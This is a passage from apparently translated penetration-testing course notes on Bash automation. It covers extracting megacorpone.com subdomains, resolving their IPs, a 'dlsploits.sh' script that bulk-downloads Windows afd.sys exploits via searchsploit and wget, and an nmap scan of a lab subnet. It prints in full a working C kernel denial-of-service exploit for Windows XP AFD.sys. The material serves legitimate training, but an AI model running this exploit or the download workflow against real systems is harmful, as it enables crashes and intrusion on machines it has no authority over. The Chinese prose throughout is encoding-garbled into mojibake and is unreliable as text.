\nadmin.megacorpone.com\nbeta.megacorpone.com\nintranet.megacorpone.com\nmail2.megacorpone.com\nmail.megacorpone.com\nsiem.megacorpone.com\nsupport.megacorpone.com\nsyslog.megacorpone.com\ntest.megacorpone.com\nvpn.megacorpone.com\nwww2.megacorpone.com\nwww.megacorpone.com\n```\n\nè¿™ä¸ªè§£å†³æ–¹æ¡ˆç›¸å½“ç´§å‡‘ï¼Œä½†å¼•å…¥äº†ä¸€äº›æ–°æŠ€æœ¯ã€‚é¦–å…ˆï¼Œæ³¨æ„ `grep -o` é€‰é¡¹ï¼Œå®ƒåªè¿”å›æˆ‘ä»¬æ­£åˆ™è¡¨è¾¾å¼ä¸­å®šä¹‰çš„å­—ç¬¦ä¸²ã€‚å¦‚æœæˆ‘ä»¬ä»”ç»†çš„å½¢æˆæˆ‘ä»¬çš„è¡¨è¾¾å¼ï¼Œè¿™ä¸ªå•ä¸€çš„å‘½ä»¤å°†å¤„ç†æˆ‘ä»¬ä¹‹å‰çš„å¤§éƒ¨åˆ†æ•°æ®é›•åˆ»ã€‚è¡¨è¾¾å¼æœ¬èº«çœ‹èµ·æ¥å¾ˆå¤æ‚ï¼Œä½†å…¶å®æ˜¯ç›¸å½“ç›´æ¥çš„ã€‚\n\næˆ‘ä»¬è¦æœç´¢çš„å­—ç¬¦ä¸² (â€™[^/]*.megacorpone.comâ€™) è¢«åŒ…è£¹åœ¨å•å¼•å·ä¸­ï¼Œæ­£å¦‚æˆ‘ä»¬æ‰€æåˆ°çš„ï¼Œå•å¼•å·ä¸å…è®¸å˜é‡æ‰©å±•ï¼Œå¹¶ä¸”ä¼šæŒ‰å­—é¢æ„æ€å¤„ç†æ‰€æœ‰è¢«åŒ…å›´çš„å­—ç¬¦ã€‚\n\nè¡¨è¾¾å¼ä¸­çš„ç¬¬ä¸€ä¸ªåŒºå— ([^/]*) æ˜¯ä¸€ä¸ªå¦å®šçš„ (^) é›†åˆ ([])ï¼Œå®ƒæœç´¢ä¸åŒ…æ‹¬æ­£æ–œæ çš„ä»»ä½•æ•°é‡çš„å­—ç¬¦ (*)ã€‚æ³¨æ„ï¼Œå¥å·ç”¨åæ–œæ  (\\.)è½¬ä¹‰çš„ï¼Œä»¥åŠ å¼ºæˆ‘ä»¬æ­£åœ¨å¯»æ‰¾ä¸€ä¸ªå­—é¢çš„å¥å·ã€‚æ¥ä¸‹æ¥ï¼Œè¯¥å­—ç¬¦ä¸²å¿…é¡»ä»¥ â€œ.megacorpone.comâ€ ç»“æŸã€‚å½“ grep æ‰¾åˆ°ä¸€ä¸ªåŒ¹é…çš„å­—ç¬¦ä¸²æ—¶ï¼Œå®ƒå°†æŠŠå®ƒä»è¿™ä¸€è¡Œä¸­åˆ†å‰²å‡ºæ¥å¹¶è¿”å›ã€‚\n\nä¸ºäº†ä»¥åçš„ä½¿ç”¨ï¼Œæˆ‘ä»¬å¯ä»¥é€šè¿‡å°†å…¶ä»–å­—ç¬¦åŒ…æ‹¬åœ¨ä¸€ä¸ªä»¥é€—å·ä¸ºé™çš„åˆ—è¡¨ä¸­æ¥å¦å®šåˆ—è¡¨ã€‚ä¾‹å¦‚ï¼Œè¿™ä¸ªå— ([^/,â€]*) å°†æ’é™¤æ­£æ–œæ å’ŒåŒå¼•å·å­—ç¬¦ã€‚\n\nè¿™æ˜¯å¾ˆå¤šæ–°çš„ææ–™ï¼Œå¯èƒ½çœ‹èµ·æ¥è®©äººä¸çŸ¥æ‰€æªï¼Œä½†è¿™æ˜¯ä¸€ä¸ªä¼Ÿå¤§çš„å¯é‡å¤ä½¿ç”¨çš„æ­£åˆ™è¡¨è¾¾å¼ï¼Œå®ƒå¯ä»¥æ‰¾åˆ°ä»»ä½•åœ¨æ­£æ–œæ ä¹‹åä»¥ â€œ.megacorpone.comâ€ ç»“å°¾çš„å­—ç¬¦ä¸²ï¼Œå¹¶å°½èŒå°½è´£çš„å°† URL å¼•ç”¨çš„å­åŸŸåˆ’å‡ºã€‚æˆ‘ä»¬ä»¥åå¯ä»¥é‡å¤ä½¿ç”¨è¿™ä¸ªæ­£åˆ™è¡¨è¾¾å¼ï¼Œä»ä¸€ä¸ªæ–‡ä»¶ä¸­åˆ†å‰²å‡ºä»»ä½•æ•°é‡çš„å­—ç¬¦ä¸²ã€‚\n\næˆ‘ä»¬æœ¬å¯ä»¥ç”¨è¿™ä¸ªæ­£åˆ™è¡¨è¾¾å¼åšå¾—æ›´å¤šï¼Œä½†è¿™æ˜¯ä¸€ä¸ªå¾ˆå¥½çš„å¼€å§‹ï¼Œä¹Ÿæ˜¯ä¸€ä¸ªå¾ˆå¥½çš„ä¾‹å­ï¼Œè¯´æ˜ä¸ºä»€ä¹ˆæ­£åˆ™è¡¨è¾¾å¼æ˜¯å¦‚æ­¤æœ‰ä»·å€¼ã€‚\n\nç°åœ¨æˆ‘ä»¬æœ‰ä¸€ä¸ªæ¼‚äº®çš„ã€å¹²å‡€çš„ã€ä» [megacorpone.com](http://megacorpone.com) çš„é¦–é¡µé“¾æ¥çš„åŸŸååˆ—è¡¨ã€‚æ¥ä¸‹æ¥ï¼Œæˆ‘ä»¬å°†ä½¿ç”¨ host æ¥å‘ç°æˆ‘ä»¬æ–‡æœ¬æ–‡ä»¶ä¸­æ¯ä¸ªåŸŸåçš„å¯¹åº” IP åœ°å€ã€‚æˆ‘ä»¬å¯ä»¥ç”¨ä¸€ä¸ª Bash å•è¡Œå¾ªç¯æ¥å®Œæˆè¿™ä¸ªä»»åŠ¡ã€‚\n\n```bash\nâ”Œâ”€â”€(rootğŸ’€kali)-[~/Desktop]\nâ””â”€# for url in $(cat list.txt); do host $url; done\nadmin.megacorpone.com has address 51.222.169.208\nbeta.megacorpone.com has address 51.222.169.209\nintranet.megacorpone.com has address 51.222.169.211\nmail2.megacorpone.com has address 51.222.169.213\nmail.megacorpone.com has address 51.222.169.212\nsiem.megacorpone.com has address 51.222.169.215\nsupport.megacorpone.com has address 51.222.169.218\nsyslog.megacorpone.com has address 51.222.169.217\ntest.megacorpone.com has address 51.222.169.219\nvpn.megacorpone.com has address 51.222.169.220\nwww2.megacorpone.com has address 149.56.244.87\nwww.megacorpone.com has address 149.56.244.87\n```\n\nhost å‘½ä»¤ç»™äº†æˆ‘ä»¬å„ç§å„æ ·çš„è¾“å‡ºï¼Œä½†å¹¶éæ‰€æœ‰çš„è¾“å‡ºéƒ½æ˜¯ç›¸å…³çš„ã€‚æˆ‘ä»¬å°†é€šè¿‡ç®¡é“ç¬¦å°†è¾“å‡ºç»“æœè¾“å…¥â€œæœ‰åœ°å€â€çš„ grep æ¥æå– IP åœ°å€ï¼Œç„¶åå¯¹ç»“æœè¿›è¡Œ cut å’Œ sortã€‚\n\n```bash\nâ”Œâ”€â”€(rootğŸ’€kali)-[~/Desktop]\nâ””â”€# for url in $(cat list.txt); do host $url; done | grep \"has address\" | cut -d \" \" -f 4 | sort -u\n149.56.244.87\n51.222.169.208\n51.222.169.209\n51.222.169.211\n51.222.169.212\n51.222.169.213\n51.222.169.215\n51.222.169.217\n51.222.169.218\n51.222.169.219\n51.222.169.220\n```\n\nå¾ˆå¥½ï¼Œæˆ‘ä»¬å·²ç»ä»ç½‘é¡µä¸­æå–äº† â€œ.megacorpone.comâ€ å­åŸŸï¼Œå¹¶è·å¾—äº†ç›¸åº”çš„ IP åœ°å€ã€‚æ­£å¦‚æˆ‘ä»¬æ‰€çœ‹åˆ°çš„ï¼Œæˆ‘ä»¬å¯ä»¥ç”¨ Bash å’Œç›¸å…³çš„å·¥å…·ä»¥åŠæ­£åˆ™è¡¨è¾¾å¼æ¥å¤„ç†æ•°æ®ï¼Œè¿™åŠ å¼ºäº†ä¸€ä¸ªäº‹å®ï¼šä»»ä½•èŠ±åœ¨æ·±å…¥ç ”ç©¶è¿™äº›ä¸»é¢˜ä¸Šçš„æ—¶é—´éƒ½ä¼šåœ¨æœªæ¥èŠ‚çœå¤§é‡çš„å¤„ç†æ•°æ®æˆ–åŠ é€Ÿè¿›ç¨‹çš„æ—¶é—´ã€‚\n\n### Bash çš„å®é™…ä½¿ç”¨ â€”â€” ä¾‹å­ 2\n\nåœ¨è¿™ä¸ªä¾‹å­ä¸­ï¼Œè®©æˆ‘ä»¬å‡è®¾æˆ‘ä»¬æ­£åœ¨è¿›è¡Œæ¸—é€æµ‹è¯•ï¼Œå¹¶ä¸”æ‹¥æœ‰å¯¹ä¸€å° Windows æœºå™¨çš„éç‰¹æƒè®¿é—®æƒã€‚å½“æˆ‘ä»¬ç»§ç»­æ”¶é›†ä¿¡æ¯æ—¶ï¼Œæˆ‘ä»¬æ„è¯†åˆ°è¿™å°æœºå™¨å¯èƒ½ä¼šè¢«ä¸€ä¸ªæˆ‘ä»¬è¯»åˆ°çš„ä»¥å­—æ¯ aã€f å’Œ d å¼€å¤´çš„æ¼æ´æ‰€æ”»å‡»ï¼Œä½†æˆ‘ä»¬ä¸è®°å¾—è¿™ä¸ªæ¼æ´çš„å…¨åã€‚ä¸ºäº†æå‡æˆ‘ä»¬çš„æƒé™ï¼Œæˆ‘ä»¬æƒ³æœç´¢é‚£ä¸ªç‰¹å®šçš„æ¼æ´ã€‚\n\nè¦åšåˆ°è¿™ä¸€ç‚¹ï¼Œæˆ‘ä»¬å°†éœ€è¦åœ¨ [https://exploit-db.com](https://exploit-db.comï¼Œ)ï¼Œæœç´¢ â€œafd windwosâ€ ä¸‹è½½ç¬¦åˆæˆ‘ä»¬æœç´¢æ¡ä»¶çš„æ¼æ´ï¼Œå¹¶æ£€æŸ¥å®ƒä»¬ï¼Œç›´åˆ°æˆ‘ä»¬æ‰¾åˆ°åˆé€‚çš„æ¼æ´ã€‚æˆ‘ä»¬å¯ä»¥é€šè¿‡ç½‘ç«™æ‰‹åŠ¨å®Œæˆï¼Œè¿™ä¸ä¼šèŠ±å¤ªå¤šæ—¶é—´ï¼Œä½†å¦‚æœæˆ‘ä»¬èŠ±æ—¶é—´å†™ä¸€ä¸ª Bash è„šæœ¬ï¼Œæˆ‘ä»¬å¾ˆå®¹æ˜“åœ°ç”¨å®ƒæ¥æœç´¢å¹¶åœ¨ä»¥åè‡ªåŠ¨ä¸‹è½½æ¼æ´ã€‚\n\nåˆ©ç”¨æˆ‘ä»¬ç°åœ¨å¯¹è„šæœ¬çš„äº†è§£ï¼Œè®©æˆ‘ä»¬è¯•ç€å°†è¿™é¡¹ä»»åŠ¡è‡ªåŠ¨åŒ–ã€‚\n\næˆ‘ä»¬å°†ä» Kali Linux ä¸Šçš„ Searchsploit å·¥å…·å¼€å§‹ã€‚Searchsploit æ˜¯ Exploit-DB çš„ä¸€ä¸ªå‘½ä»¤è¡Œæœç´¢å·¥å…·ï¼Œå®ƒå…è®¸æˆ‘ä»¬æ— è®ºèµ°åˆ°å“ªé‡Œéƒ½èƒ½å¸¦ç€ Exploit æ•°æ®åº“çš„ç¦»çº¿æ‹·è´ã€‚æˆ‘ä»¬å°†ä¼ é€’ â€œafd windowsâ€ ä½œä¸ºæœç´¢å­—ç¬¦ä¸²ï¼Œä½¿ç”¨ `-w` æ¥è¿”å› https://www.exploit-db.comï¼Œè€Œä¸æ˜¯æœ¬åœ°è·¯å¾„ï¼Œä»¥åŠ `-t` æ¥æœç´¢æ¼æ´æ ‡é¢˜ã€‚\n\n```bash\nâ”Œâ”€â”€(rootğŸ’€kali)-[~/Desktop]\nâ””â”€# searchsploit afd windows -w -t\n----------------------------------------------------------------------------------------------------------------------------------------------------------------------- --------------------------------------------\n Exploit Title                                                                                                                                                         |  URL\n----------------------------------------------------------------------------------------------------------------------------------------------------------------------- --------------------------------------------\nMicrosoft Windows (x86) - 'afd.sys' Local Privilege Escalation (MS11-046)                                                                                              | <https://www.exploit-db.com/exploits/40564>\nMicrosoft Windows - 'afd.sys' Local Kernel (PoC) (MS11-046)                                                                                                            | <https://www.exploit-db.com/exploits/18755>\nMicrosoft Windows - 'AfdJoinLeaf' Local Privilege Escalation (MS11-080) (Metasploit)                                                                                   | <https://www.exploit-db.com/exploits/21844>\nMicrosoft Windows 7 (x64) - 'afd.sys' Dangling Pointer Privilege Escalation (MS14-040)                                                                                 | <https://www.exploit-db.com/exploits/39525>\nMicrosoft Windows 7 (x86) - 'afd.sys' Dangling Pointer Privilege Escalation (MS14-040)                                                                                 | <https://www.exploit-db.com/exploits/39446>\nMicrosoft Windows 7 Kernel - Pool-Based Out-of-Bounds Reads Due to bind() Implementation Bugs in afd.sys / tcpip.sys                                                   | <https://www.exploit-db.com/exploits/42009>\nMicrosoft Windows XP - 'afd.sys' Local Kernel Denial of Service                                                                                                        | <https://www.exploit-db.com/exploits/17133>\nMicrosoft Windows XP/2003 - 'afd.sys' Local Privilege Escalation (K-plugin) (MS08-066)                                                                                 | <https://www.exploit-db.com/exploits/6757>\nMicrosoft Windows XP/2003 - 'afd.sys' Local Privilege Escalation (MS11-080)                                                                                            | <https://www.exploit-db.com/exploits/18176>\n----------------------------------------------------------------------------------------------------------------------------------------------------------------------- --------------------------------------------\nShellcodes: No Results\n```\n\nè¿™æ˜¯ä¸€ä¸ªå¥½çš„å¼€å§‹ï¼Œä½†æˆ‘ä»¬éœ€è¦å¯¹ç»“æœè¿›è¡Œä¿®é¥°ã€‚ç°åœ¨ï¼Œæˆ‘ä»¬åªå¯¹è¯¥æ¼æ´çš„ URL æ„Ÿå…´è¶£ï¼Œæ‰€ä»¥è®©æˆ‘ä»¬æœç´¢ â€œhttpâ€ï¼Œç„¶åå‰ªåˆ‡æˆ‘ä»¬éœ€è¦çš„å†…å®¹ã€‚æˆ‘ä»¬å°†ä½¿ç”¨ä¸€ä¸ª â€œ|â€ å­—ç¬¦åˆ†éš”ç¬¦ï¼Œå¹¶æå–ç¬¬äºŒä¸ªå­—æ®µã€‚\n\n```bash\nâ”Œâ”€â”€(rootğŸ’€kali)-[~/Desktop]\nâ””â”€# searchsploit afd windows -w -t|grep http|cut -f 2 -d \"|\"\n <https://www.exploit-db.com/exploits/40564>\n <https://www.exploit-db.com/exploits/18755>\n <https://www.exploit-db.com/exploits/21844>\n <https://www.exploit-db.com/exploits/39525>\n <https://www.exploit-db.com/exploits/39446>\n <https://www.exploit-db.com/exploits/42009>\n <https://www.exploit-db.com/exploits/17133>\n <https://www.exploit-db.com/exploits/6757>\n <https://www.exploit-db.com/exploits/18176>\n```\n\nè¿™çœ‹èµ·æ¥å¥½ä¸€ç‚¹ã€‚æˆ‘ä»¬ç°åœ¨æœ‰äº†æ¯ä¸ªæ¼æ´çš„ URLï¼Œæˆ‘ä»¬å¯ä»¥ä½¿ç”¨ Bash å¾ªç¯æ¥ä¸‹è½½å¹¶ä¿å­˜åœ¨æœ¬åœ°ã€‚ç„¶è€Œï¼Œåœ¨æˆ‘ä»¬è¿™æ ·åšä¹‹å‰ï¼Œæˆ‘ä»¬æ³¨æ„åˆ°æ¯ä¸ªé¡µé¢éƒ½æœ‰ä¸€ä¸ªä¸‹è½½â€œåŸå§‹â€æ¼æ´ä»£ç çš„é“¾æ¥ï¼Œè¿™æ‰æ˜¯æˆ‘ä»¬çœŸæ­£æƒ³è¦çš„ä¸œè¥¿ã€‚\n\n![Untitled](https://s3-us-west-2.amazonaws.com/secure.notion-static.com/e846046b-1782-4e71-8114-f2bbf84b426b/Untitled.png)\n\næˆ‘ä»¬çœ‹åˆ°ï¼Œæ¯ä¸ªåŸå§‹é¡µé¢ï¼ˆå¦‚ /exploits/40564ï¼‰éƒ½é“¾æ¥åˆ°ä¸€ä¸ªåŸå§‹æ¼æ´ï¼ˆå¦‚ /raw/40564ï¼‰ã€‚æœ‰äº†è¿™äº›ä¿¡æ¯ï¼Œæˆ‘ä»¬è¿è¡Œ sed (sed â€˜s/exploits/raw/â€™) æ¥ä¿®æ”¹ä¸‹è½½ URLï¼Œå¹¶å°†å…¶æ’å…¥ Bash å•è¡Œç¨‹åºï¼Œä»¥ä¸‹è½½æ¼æ´çš„åŸå§‹ä»£ç ã€‚\n\n```bash\nâ”Œâ”€â”€(rootğŸ’€kali)-[~/Desktop/OSCP/exploits]\nâ””â”€# for e in $(searchsploit afd windows -w -t | grep http | cut -f 2 -d \"|\"); do exp_name=$(echo $e | cut -d \"/\" -f 5) && url=$(echo $e | sed 's/exploits/raw/') && wget -q --no-check-certificate $url -O $exp_name; done\n```\n\nè¯·æ³¨æ„ï¼Œæˆ‘ä»¬ä½¿ç”¨äº†ä¸€ä¸ª for å¾ªç¯æ¥è¿­ä»£æˆ‘ä»¬æŠ“å–çš„ Searchsploit URLã€‚åœ¨è¿™ä¸ªå¾ªç¯ä¸­ï¼Œæˆ‘ä»¬å°† exp_name è®¾ç½®ä¸ºæ¼æ´çš„â€œåç§°â€ï¼ˆä½¿ç”¨ grepã€cut å’Œå‘½ä»¤æ›¿æ¢ï¼‰ï¼Œå°† url è®¾ç½®ä¸ºåŸå§‹ä¸‹è½½ä½ç½®ï¼ˆåŒæ ·ä½¿ç”¨ sed å’Œå‘½ä»¤æ›¿æ¢ï¼‰ã€‚å¦‚æœæˆåŠŸäº†ï¼ˆ&&ï¼‰ï¼Œæˆ‘ä»¬ä½¿ç”¨ wget æŠ“å–æ¼æ´ï¼ˆåœ¨å®‰é™æ¨¡å¼ä¸‹ï¼Œæ²¡æœ‰è¯ä¹¦æ£€æŸ¥ï¼‰ï¼Œå°†å…¶ä¿å­˜åœ¨æœ¬åœ°ï¼Œæ¼æ´åç§°ä¸ºæœ¬åœ°æ–‡ä»¶åã€‚\n\nä¸€æ—¦æˆ‘ä»¬è¿è¡Œå®ƒï¼Œæˆ‘ä»¬å°±ç­‰å¾…å‘½ä»¤æç¤ºï¼Œå¹¶éªŒè¯æ¼æ´ç¡®å®è¢«ä¸‹è½½äº†ï¼Œä½¿ç”¨æ–‡ä»¶æ¥éªŒè¯æ–‡ä»¶æ—¶æ–‡æœ¬ã€‚\n\n```bash\nâ”Œâ”€â”€(rootğŸ’€kali)-[~/Desktop/OSCP/exploits]\nâ””â”€# ls -l           \næ€»ç”¨é‡ 120\n-rw-r--r-- 1 root root  1363  3æœˆ 30 04:01 17133\n-rw-r--r-- 1 root root 12215  3æœˆ 30 04:01 18176\n-rw-r--r-- 1 root root  9698  3æœˆ 30 04:00 18755\n-rw-r--r-- 1 root root 11590  3æœˆ 30 04:00 21844\n-rw-r--r-- 1 root root 10575  3æœˆ 30 04:00 39446\n-rw-r--r-- 1 root root 14193  3æœˆ 30 04:00 39525\n-rw-r--r-- 1 root root 32674  3æœˆ 30 04:00 40564\n-rw-r--r-- 1 root root 12636  3æœˆ 30 04:00 42009\n-rw-r--r-- 1 root root   612  3æœˆ 30 04:01 6757\n\nâ”Œâ”€â”€(rootğŸ’€kali)-[~/Desktop/OSCP/exploits]\nâ””â”€# file 17133                     \n17133: C source, ASCII text, with CRLF line terminators\n```\n\næˆ‘ä»¬å¯ä»¥æ£€æŸ¥æ¯ä¸ªæ¼æ´ï¼Œå¹¶çœ‹åˆ°æˆ‘ä»¬ç¡®å®æŠ“ä½äº†åŸå§‹æ¼æ´ï¼š\n\n```bash\nâ”Œâ”€â”€(rootğŸ’€kali)-[~/Desktop/OSCP/exploits]\nâ””â”€# cat 17133\n////////////////////////////////////////////////////////////////////////////\n//\n// Title: Microsoft Windows xp AFD.sys Local Kernel DoS Exploit\n// Author: Lufeng Li of Neusoft Corporation\n// Vendor: www.microsoft.com\n// Vulnerable: Windows xp sp3\n//\n/////////////////////////////////////////////////////////////////////////////\n\n#include <stdio.h>\n#include <Winsock2.h>\n\n#pragma comment (lib, \"ws2_32.lib\")\n\nBYTE buf[]={\n0xac,0xfd,0xd3,0x00,0x01,0x00,0x00,0x00,0x00,0x00,\n0x00,0x00,0x20,0x00,0x00,0x00,0xe8,0xfd,0xd3,0x00,\n0xb8,0xfd,0xd3,0x00,0xf8,0xfd,0xd3,0x00,0xc4,0xfd,\n0xd3,0x00,0xcc,0xfd,0xd3,0x00};\n\nint main( )\n{\n    WSADATA ws;\n\n    SOCKET tcp_socket;\n    struct sockaddr_in peer;\n        ULONG  dwReturnSize;\n\n        printf(\"\\\\n Microsoft Windows xp AFD.sys Local Kernel DoS Exploit \\\\n\\\\n\");\n        printf(\"\\\\t Create by Lufeng Li of Neusoft Corporation. \\\\n\\\\n\");\n\n    WSAStartup(0x0202,&ws);\n\n    peer.sin_family = AF_INET;\n    peer.sin_port = htons( 0x01bd );\n    peer.sin_addr.s_addr = inet_addr( \"127.0.0.1\" );\n\n    tcp_socket = socket(AF_INET, SOCK_DGRAM, 0);//SOCK_DGRAM\n\n        if ( connect(tcp_socket, (struct sockaddr*) &peer, sizeof(struct sockaddr_in)) )\n    {\n                printf(\"connect error\\\\n\");\n        exit(0);\n    }\n\n        DeviceIoControl( (HANDLE)tcp_socket,0x000120cf, buf,0x24,buf,0x24,&dwReturnSize, NULL);\n\n    return TRUE;\n}\n```\n\nå°½ç®¡æˆ‘ä»¬ç”¨ Bash å•è¡Œç¨‹åºå–å¾—äº†æˆåŠŸï¼Œä½†æˆ‘ä»¬çš„ä»£ç å¹¶ä¸æ˜¯å¾ˆå¹²å‡€ï¼Œè€Œä¸”ä¹Ÿä¸æ˜¯ç‰¹åˆ«å®¹æ˜“é‡å¤ä½¿ç”¨ã€‚è®©æˆ‘ä»¬æŠŠæ‰€æœ‰ä¸œè¥¿æ”¾åœ¨ä¸€ä¸ª Bash è„šæœ¬ä¸­æ¥è§£å†³è¿™äº›é—®é¢˜ã€‚\n\n```bash\nkali@kali:~$ cat dlsploits.sh\n#!/bin/bash\n# Bash script to search for a given exploit and download all matches.\n\nfor e in $(searchsploit afd windows -w -t | grep http | cut -f 2 -d \"|\")\n\ndo\n exp_name=$(echo $e | cut -d \"/\" -f 5)\n url=$(echo $e | sed 's/exploits/raw/')\n wget -q --no-check-certificate $url -O $exp_name\ndone\n\nkali@kali:~$ chmod +x ./dlsploits.sh\n\nkali@kali:~$ ./dlsploits.sh\n```\n\næˆ‘ä»¬ç°åœ¨å¯ä»¥æ‰‹åŠ¨æ£€æŸ¥æ¼æ´ï¼Œæ‰¾åˆ°æˆ‘ä»¬æ„Ÿå…´è¶£çš„æ¼æ´ï¼Œåœ¨æµ‹è¯•æœºå™¨ä¸Šè¯•ä¸€è¯•ï¼Œæœ€ååœ¨ç›®æ ‡ä¸Šè¿è¡Œé€‚å½“çš„æ¼æ´ï¼Œå› ä¸ºåœ¨æ´»çš„ç›®æ ‡ä¸Šéšæœºåˆ©ç”¨æ¼æ´æ˜¯ä¸å¥½çš„å½¢å¼ï¼Œæ˜¯å®Œå…¨ç¾éš¾çš„ç§˜è¯€ã€‚\n\n### Bash çš„å®é™…ä½¿ç”¨ â€”â€” ä¾‹å­ 3\n\nä½œä¸ºæ¸—é€æµ‹è¯•äººå‘˜ï¼Œæˆ‘ä»¬ä¸€ç›´åœ¨åŠªåŠ›å¯»æ‰¾æ•ˆç‡ï¼Œä»¥å‡å°‘æˆ‘ä»¬åˆ†ææ•°æ®çš„æ—¶é—´ï¼Œç‰¹åˆ«æ˜¯åœ¨å„ç§æ‰«æä¸­æ¢å¤çš„æ•°æ®é‡ã€‚\n\nè®©æˆ‘ä»¬å‡è®¾æˆ‘ä»¬çš„ä»»åŠ¡æ˜¯æ‰«æä¸€ä¸ª C ç±»å­ç½‘ï¼Œä»¥è¯†åˆ«ç½‘ç»œæœåŠ¡å™¨å¹¶ç¡®å®šå®ƒä»¬æ˜¯å¦å‘ˆç°å‡ºæœ‰è¶£çš„æ”»å‡»é¢ã€‚ç«¯å£æ‰«ææ˜¯æ£€æŸ¥è¿œç¨‹æœºå™¨ä¸Šçš„ TCP æˆ– UDP ç«¯å£çš„è¿‡ç¨‹ï¼Œç›®çš„æ˜¯æ£€æŸ¥ç›®æ ‡æœºå™¨ä¸Šæœ‰å“ªäº›æœåŠ¡å™¨åœ¨è¿è¡Œï¼Œå¯èƒ½å­˜åœ¨å“ªäº›æ”»å‡»è½½ä½“ã€‚æˆ‘ä»¬å°†åœ¨å¦ä¸€ä¸ªæ¨¡å—ä¸­æ›´è¯¦ç»†åœ°è®¨è®ºç«¯å£æ‰«æï¼Œä½†ç°åœ¨ï¼Œè®©æˆ‘ä»¬ä¿æŒä¸€èˆ¬æ€§ï¼Œå› ä¸ºè¿™æ˜¯ä¸€ä¸ªå¾ˆå¥½çš„ä¾‹å­ï¼Œè¯´æ˜ Bash è„šæœ¬å¯ä»¥è‡ªåŠ¨å®Œæˆä¸€é¡¹ç›¸å½“ä¹å‘³çš„ä»»åŠ¡ã€‚\n\nä¸ºäº†å®ç°æˆ‘ä»¬çš„ç›®æ ‡ï¼Œæˆ‘ä»¬é¦–å…ˆä¼šå¯¹æ•´ä¸ªå­ç½‘è¿›è¡Œç«¯å£æ‰«æï¼Œä»¥ç¡®å®šæ½œåœ¨çš„å¼€æ”¾ç½‘ç»œæœåŠ¡ï¼Œç„¶åæˆ‘ä»¬å¯ä»¥æ‰‹åŠ¨æµè§ˆå®ƒä»¬çš„ç½‘é¡µã€‚\n\né¦–å…ˆï¼Œè®©æˆ‘ä»¬åˆ›å»ºä¸€ä¸ªä¸´æ—¶æ–‡ä»¶å¤¹ï¼Œç”¨äºè¿™ä¸ªç»ƒä¹ ã€‚\n\n```bash\nkali@kali:~$ mkdir temp\n\nkali@kali:~$ cd temp/\n```\n\nç°åœ¨æˆ‘ä»¬å·²ç»åˆ›å»ºäº†è¿™ä¸ªç›®å½•ï¼Œå¹¶ä¸”ç”¨ cd è¿›å…¥äº†è¿™ä¸ªç›®å½•ï¼Œè®©æˆ‘ä»¬è¿›å…¥æ›´æœ‰è¶£çš„éƒ¨åˆ†ï¼Œå¯¹ C ç±»å­ç½‘è¿›è¡Œæ‰«æã€‚æˆ‘ä»¬å°†åªå…³æ³¨ 80 ç«¯å£ï¼Œä»¥ä¿æŒä¸€å®šçš„å¯ç®¡ç†æ€§ï¼Œæˆ‘ä»¬å°†ä½¿ç”¨ nmapï¼ˆæˆ‘ä»¬åœ¨åé¢çš„æ¨¡å—ä¸­è®¨è®ºï¼‰ä½œä¸ºæˆ‘ä»¬çš„ç«¯å£æ‰«æå·¥å…·ã€‚\n\n```bash\nkali@kali:~/temp$ sudo nmap -A -p80 --open 10.11.1.0/24 -oG nmap-scan_10.11.1.1-254\nStarting Nmap 7.60 ( <https://nmap.org> ) at 2019-03-18 18:57 EDT\nNmap scan report for 10.11.1.8\nHost is up (0.030s latency).2\n\nPORT STATE SERVICE VERSION\n80/tcp open http Apache httpd 2.0.52 ((CentOS))\n| http-methods:\n|_ Potentially risky methods: TRACE\n| http-robots.txt: 2 disallowed entries\n|_/internal/ /tmp/\n|_http-server-header: Apache/2.0.52 (CentOS)\n|_http-title: Site doesn't have a title (text/html; charset=UTF-8).\nMAC Address: 00:50:56:89:20:34 (VMware)\nWarning: OSScan results may be unreliable because we could not find at least 1 open an\nDevice type: general purpose|WAP|firewall|proxy server|PBX\nRunning (JUST GUESSING): Linux 2.6.X (92%), ZoneAlarm embedded (90%), Cisco embedded\nAggressive OS guesses: Linux 2.6.18 (92%), Linux 2.6.9 (92%), Linux 2.6.9 - 2.6.27 (90\nNo exact OS matches for host (test conditions non-ideal).\nNetwork Distance: 1 hop\n\nTRACEROUTE\nHOP RTT ADDRESS\n1 30.19 ms 10.11.1.8\n\nNmap scan report for 10.11.1.10\nHost is up (0.030s latency).\n\nPORT STATE SERVICE VERSION\n80/tcp open http Microsoft IIS httpd 6.0\n| http-methods:\n|_ Potentially risky methods: TRACE\n|_http-server-header: Microsoft-IIS/6.0\n|_http-title: Under Construction\nMAC Address: 00:50:56:89:06:D0 (VMware)\nWarning: OSScan results may be unreliable because we could not find at least 1 open an\nDevice type: general purpose|WAP\nRunning (JUST GUESSING): Microsoft Windows 2003|XP|2000 (89%), Apple embedded (86%)\nOS CPE: cpe:/o:microsoft:windows_server_2003::sp2 cpe:/o:microsoft:windows_xp::sp3 cpe\nNo exact OS matches for host (test conditions non-ideal).\nNetwork Distance: 1 hop\nService Info: OS: Windows; CPE: cpe:/o:microsoft:windows\n\nTRACEROUTE\nHOP RTT ADDRESS\n1 30.41 ms 10.11.1.10\n...\n```\n\nè¿™æ˜¯ä¸€ä¸ªéå¸¸ç›´æ¥çš„æ‰«æï¼Œ `-A` è¡¨ç¤ºç§¯æçš„æ‰«æï¼Œ `-p` æŒ‡å®šç«¯å£æˆ–ç«¯å£èŒƒå›´ï¼Œ `-open` åªè¿”å›æœ‰å¼€æ”¾ç«¯å£çš„æœºå™¨ï¼Œ `-oG` ä»¥ greppable æ ¼å¼ä¿å­˜æ‰«æç»“æœã€‚å†è¯´ä¸€éï¼Œå¦‚æœ nmap å¯¹ä½ æ¥è¯´æ˜¯é™Œç”Ÿçš„ï¼Œä¸è¦ç€æ€¥ã€‚æˆ‘ä»¬å°†åœ¨åé¢è®¨è®ºç»†èŠ‚ï¼Œä½† nmap è‚¯å®šæä¾›äº†ç›¸å½“æ•°é‡çš„è¾“å‡ºæ¥å·¥ä½œã€‚\n\nè®©æˆ‘ä»¬ cat è¾“å‡ºæ–‡ä»¶æ¥ç†Ÿæ‚‰å®ƒçš„æ ¼å¼ã€‚\n\n```bash\nkali@kali:~/temp$ cat nmap-scan_10.11.1.1-254\n# Nmap 7.60 scan initiated Sun Mar 18 18:57:48 2019 as: nmap -A -p80 --open -oG nmapscan_10.11.1.1-254 10.11.1.0/24\nHost: 10.11.1.8 () Status: Up\nHost: 10.11.1.8 () Ports: 80/open/tcp//http//Apache httpd 2.0.52 ((CentOS))/ Seq\nIndex: 197 IP ID Seq: All zeros\nHost: 10.11.1.10 () Status: Up\nHost: 10.11.1.10 () Ports: 80/open/tcp//http//Microsoft IIS httpd 6.0/ Seq Index: 